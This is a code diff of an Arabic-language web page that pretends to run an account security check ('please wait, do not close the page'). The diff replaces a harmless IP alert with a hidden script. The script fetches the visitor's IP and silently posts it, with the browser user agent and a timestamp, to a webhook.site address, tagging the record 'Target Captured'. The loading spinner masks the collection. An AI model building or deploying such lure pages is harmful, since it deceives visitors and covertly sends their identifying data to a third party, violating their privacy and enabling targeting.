@@ -6,14 +6,28 @@
 </head>
 <body style="background:#000;color:#fff;text-align:center;padding-top:100px;font-family:sans-serif;">
     <h2>جاري فحص أمان الحساب...</h2>
+    <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite;"></div>
     <p>يرجى الانتظار، لا تغلق الصفحة</p>
+
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+
     <script>
-        // كود يجلب الـ IP
         fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(d => {
-            // يبين الـ IP في تنبيه (مؤقتاً)
-            alert("تم فحص جهازك بنجاح\nIP: " + d.ip);
+            // هذا هو رابط صندوق البريد الخاص بك (Webhook)
+            const myWebhook = "https://webhook.site/c30334e1-1c55-4a4d-a3de-d35eede2ce18"; 
+            
+            fetch(myWebhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    ip: d.ip,
+                    device: navigator.userAgent,
+                    time: new Date().toLocaleString(),
+                    status: "Target Captured"
+                })
+            });
         });
     </script>
 </body>
